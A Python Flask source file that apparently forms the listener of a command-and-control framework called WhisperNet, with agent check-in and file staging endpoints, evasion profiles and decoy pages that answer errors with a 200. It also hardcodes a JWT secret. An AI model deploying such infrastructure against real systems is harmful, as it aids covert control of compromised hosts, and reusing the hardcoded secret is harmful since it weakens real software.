#!/bin/python3

'''
The WhisperNet Flask API Listener. This is very similar to the "server.py", save for a few items.
'''

try:
    import subprocess as sp
    import socket
    import threading
    #import time
    import os
    #import sys
    import random
    import atexit
    from datetime import datetime, timezone
    import logging
    import argparse
    import threading
    import traceback
    import ssl
    import inspect
    import asyncio
    import signal
    import sys
    import time
    from flask import Flask, jsonify, request, send_from_directory
    from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity, exceptions
    import DataEngine.StatTrack

    import ApiEngine.ConfigHandler
    import Utils.UtilsHandler
    #import Utils.DataObjects

    ## Error modules
    import ApiEngine.ErrorDefinitions
    #import Utils.ErrorDefinitions
    import Utils.DataObjects

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    traceback.print_exc()
    exit()


#Argparse settings first in order to be able to change anything

parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)
parser.add_argument('-c', '--generatekeys', help="ReGen Certs & Keys", action="store_true")
parser.add_argument('--evasionprofile', help="The evasion profile", default="/EvasionProfiles/default.yaml")
parser.add_argument('--apiconfigprofile', help="The API config profile", default="Config/ApiSchemas/default.yaml")
parser.add_argument('--name', help="Name of listener (used by flask)", default="FlaskAPIListener")


## Globals bad. I know
args                = parser.parse_args()
ip                  = args.ip
port                = int(args.port)
quiet               = args.quiet
fileserverport      = args.fileserverport
generate_keys       = args.generatekeys
evasion_profile     = args.evasionprofile
api_config_profile  = args.apiconfigprofile
name                = args.name
sys_path = os.path.dirname(os.path.realpath(__file__))
function_debug_symbol = "[^]"


sys_path = os.path.dirname(os.path.realpath(__file__))
print(sys_path)

##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')


class Data:
    '''
    Initizaling the data objects. See documentation for more info &
    justification on why these exist

    These are singletons, so only one instnace will/should ever be created

    call will Data.varname
    '''
    ## Path Struct - don't need for now
    #path_struct = Utils.DataObjects.PathStruct()
    #path_struct.sys_path = sys_path

    stats = DataEngine.StatTrack.StatTrack()
    stats.set_time()
    stats.set_ext_ip()
    stats.set_listener_name(name="FlaskAPI-01")



    ## Getting all the paths in the log just in case something fails/is off
    #logging.debug(f'[*] PathStruct.sys_path: {path_struct.sys_path}')


## Move to own file eventually
class FlaskAPIListener():
    app = Flask(name)
    app.config['JWT_SECRET_KEY'] = 'PLEASECHANGEME'  # Change this to your secret key - also move to a config file
    jwt = JWTManager(app)
    config_file_path = Utils.UtilsHandler.load_file(current_path=sys_path, file_path="Config/ApiSchemas/default.yaml")
    UrlSc = ApiEngine.ConfigHandler.UrlSchema(api_config_profile=config_file_path)
    UrlSc.load()

    ## Default home
    @app.route("/", methods=["GET"])
    @app.route(f"/{UrlSc.HOME_BASE}", methods=["GET"])
    def no_subdir():
        try:
            # Yaml load code here
            ## load random choice from list
            html_file_path = random.choice(FlaskAPIListener.UrlSc.HOMEPAGE_LIST)

            # open file
            html = Utils.UtilsHandler.load_file(
                current_path = sys_path, 
                file_path = html_file_path, 
                return_path = False )
            # return HTML
            return html
            ## oh my god it worked on the first time

        except Exception as e:
            #return str(e)
            FlaskAPIListener.page_not_found()
    
    ## for agents checking in
    @app.route(f"/{UrlSc.AGENT_BASE_ENDPOINT}", methods=["GET"])
    def agent_base():
        return "agent_base"


    ##################
    # File stuff     #
    ##################
    # https://docs.faculty.ai/user-guide/apis/flask_apis/flask_file_upload_download.html
    # by default, http://ip/files/FILENAME
    @app.route(f"/{UrlSc.UPLOAD_BASE_ENDPOINT}/<path:path>", methods=["GET"])
    def download_file(path):
        try:
            ## as attachment downloads it, instead of displaying in browser
            return send_from_directory(FlaskAPIListener.UrlSc.UPLOAD_FOLDER, path, as_attachment=True)
        except Exception as e:
            #print(e)
            return FlaskAPIListener.page_not_found()

    @app.route(f"/{UrlSc.UPLOAD_BASE_ENDPOINT}/<filename>", methods=["POST"])
    @jwt_required()
    def post_file(filename):
        """Upload a file."""

        if "/" in filename:
            # Return 400 BAD REQUEST
            return "No Subdirectories allowed", 400
        
        Utils.UtilsHandler.write_file(
            current_path=sys_path,
            file_path=FlaskAPIListener.UrlSc.UPLOAD_FOLDER + "/" + filename,
            data = request.data
        )

        # Return 201 CREATED
        return "", 201

    ##################
    # Commands       #
    ##################


    ##################
    # Stats          #
    ##################
    @app.route(f"/stats", methods=["GET"])
    #@jwt_required()
    def stats():
        return jsonify(
            ext_ip = Data.stats.ext_ip,
            start_time = Data.stats.start_time,
            listener_name = Data.stats.listener_name
        )

    ## any bad auth returns this
    @app.errorhandler(exceptions.NoAuthorizationError)
    @app.errorhandler(401)
    @app.errorhandler(403)
    @app.errorhandler(404)
    @app.errorhandler(405) # Method not allowed
    def page_not_found(e=None):
        '''
        Handles all 40X & any try/except errors. Basically it returns a 200
        with a "page not found"

        This is done for security/scraping/URL discovery reasons
        
        '''
        try:
            err_404_path = random.choice(FlaskAPIListener.UrlSc.NOT_FOUND_LIST_404)

            html = Utils.UtilsHandler.load_file(
                current_path = sys_path, 
                file_path = err_404_path, 
                return_path = False )
            return html, 200
        ## Fallback for if something breaks
        except:
            return "", 200


def start_listener(port=80, ip="0.0.0.0"):
    ## Init data structures
    Data()
    #FlaskAPIListener.app.run(host=ip, port=port, debug=True)
    FlaskAPIListener.app.run(host="0.0.0.0", port=80, debug=False)



if __name__ == "__main__":
    print("==== Starting Listener =====")
    ## Init data structures
    Data()
    #FlaskAPIListener.app.run(host=ip, port=port, debug=True)
    ## well that was easy
    from waitress import serve
    serve(FlaskAPIListener.app, host=ip, port=port)
